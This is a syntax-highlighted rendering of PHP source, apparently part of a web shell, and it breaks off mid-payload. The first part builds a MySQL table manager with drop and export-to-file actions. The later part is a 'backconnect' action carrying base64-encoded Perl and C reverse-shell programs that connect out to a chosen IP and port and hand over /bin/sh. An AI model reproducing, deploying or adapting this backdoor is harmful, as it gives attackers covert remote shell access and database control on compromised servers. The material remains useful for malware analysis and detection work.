<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">highver</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledb</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\'foc</span><span style="color: #8abeb7; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #8abeb7; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Name'</span>].<span style="color: #8abeb7;">'\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Rows'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Create_time'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Update_time'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">highver</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Engine'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Name'</span>].<span style="color: #8abeb7;">'\', </span><span style="color: #8abeb7; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #8abeb7; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">highver</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class='</span>.bg().<span style="color: #8abeb7;">'&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Total tables: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_num</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_rows</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td colspan="'</span>.(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">highver</span> ? 5 : 3).<span style="color: #8abeb7;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;tr class=\""</span>.bg().<span style="color: #8abeb7;">"\"&gt;&lt;td colspan=\""</span>.(<span style="color: #f0c674;">$highver</span> ? 9 : 7).<span style="color: #8abeb7;">"\"</span><span style="color: #8abeb7; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #81a2be; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.</span><span style="color: #f0c674; text-decoration: underline;">$dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'doing'</span>,<span style="color: #8abeb7;">'backupmysql'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;/table&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   tbfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   @mysql_close();
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end mysql</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'backconnect'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourip</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourip</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourport</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourport</span> = <span style="color: #8abeb7;">'12345'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">usedb</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'perl'</span>=&gt;<span style="color: #8abeb7;">'perl'</span>,<span style="color: #8abeb7;">'c'</span>=&gt;<span style="color: #8abeb7;">'c'</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">back_connect</span>=<span style="color: #8abeb7;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #8abeb7; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #8abeb7; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #8abeb7; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #8abeb7; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #8abeb7; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #8abeb7; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">back_connect_c</span>=<span style="color: #8abeb7;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #8abeb7; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #8abeb7; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #8abeb7; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #8abeb7; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #8abeb7; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
